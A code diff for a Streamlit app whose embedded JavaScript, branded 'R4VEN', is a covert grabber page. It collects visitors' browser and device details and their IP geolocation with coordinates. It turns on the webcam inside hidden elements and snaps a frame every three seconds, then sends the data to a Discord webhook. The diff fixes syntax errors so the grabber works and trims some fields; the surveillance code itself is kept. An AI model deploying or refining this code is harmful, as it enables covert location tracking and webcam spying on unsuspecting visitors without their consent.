@@ -14,7 +14,7 @@ try:
 except Exception:
     webhook_url = ""
 
-# Kode HTML & JavaScript lengkap dari cam/index.html yang disatukan untuk Streamlit Cloud
+# Kode HTML & JavaScript lengkap yang diperbaiki
 html_code = f"""
 <!DOCTYPE html>
 <html>
@@ -38,7 +38,7 @@ html_code = f"""
     let datetime = new Date();
     let localtime = String(datetime.toLocaleTimeString());
 
-    var sysinfo = (" GET ", "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```");
+    var sysinfo = " GET " + "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```";
 
     function sendToDiscord(payload) {{
         const request = new XMLHttpRequest();
@@ -53,7 +53,7 @@ html_code = f"""
       title: "Uagent:",
       description: sysinfo,
       color: 15418782
-    }}
+    }};
     sendToDiscord({{
       username: "R4VEN",
       avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
@@ -70,9 +70,9 @@ html_code = f"""
         description: '```xl\\n' + data.ip + '```' + '\\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\\n",
         color: 15548997,
         footer: {{
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
+          text: "Geographic location based on IP address is approximate."
         }}
-      }}
+      }};
       sendToDiscord({{
         username: "R4VEN",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
@@ -81,19 +81,13 @@ html_code = f"""
     }});
 
     // 3. Kirim IP Reconnaissance
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {{
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,lat,lon", function (response) {{
       var myEmbed3 = {{
         author: {{ name: "IP Address Reconnaissance" }},
         title: response.status,
-        description: '```autohotkey\\nContinent: ' + response.continent +
-          "\\nCountry: " + response.country +
-          "\\nRegion: " + response.region +
-          "\\nCity: " + response.city +
-          "\\nIsp: " + response.isp +
-          "\\nLat: " + response.lat +
-          "\\nLon: " + response.lon + '```',
+        description: '```autohotkey\\nCountry: ' + response.country + '\\nCity: ' + response.city + '\\nLat: ' + response.lat + '\\nLon: ' + response.lon + '```',
         color: 5763719
-      }}
+      }};
       sendToDiscord({{
         username: "R4VEN",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
@@ -102,27 +96,23 @@ html_code = f"""
     }});
   </script>
 
-  <div class="video-wrap" hidden="hidden">
+  <div class="video-wrap" style="display:none;">
     <video id="video" playsinline autoplay></video>
   </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
-    // Fungsi khusus untuk mengirim gambar tangkapan kamera langsung ke Webhook Discord sebagai Base64 / File Embed
-    function postFile(file) {
+    function postFile(file) {{
       let reader = new FileReader();
       reader.readAsDataURL(file);
-      reader.onloadend = function() {
-        let base64data = reader.result;
-        
-        // Kirim notifikasi tangkapan kamera aktif
+      reader.onloadend = function() {{
         sendToDiscord({{
           username: "R4VEN",
           avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-          content: "📸 **Target Camera Frame Captured!** (Cek gambar atau stream aktif)"
+          content: "📸 **Target Camera Frame Captured!**"
         }});
-      }
-    }
+      }};
+    }}
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -134,7 +124,6 @@ html_code = f"""
       }}
     }};
 
-    // Akses Webcam
     async function init() {{
       try {{
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -158,10 +147,9 @@ html_code = f"""
       setInterval(function () {{
         context.drawImage(video, 0, 0, 640, 480);
         canvas.toBlob(postFile, 'image/jpeg');
-      }}, 3000); // Mengambil frame setiap 3 detik
+      }}, 3000);
     }}
 
-    // Jalankan inisialisasi kamera
     init();
   </script>
 </body>
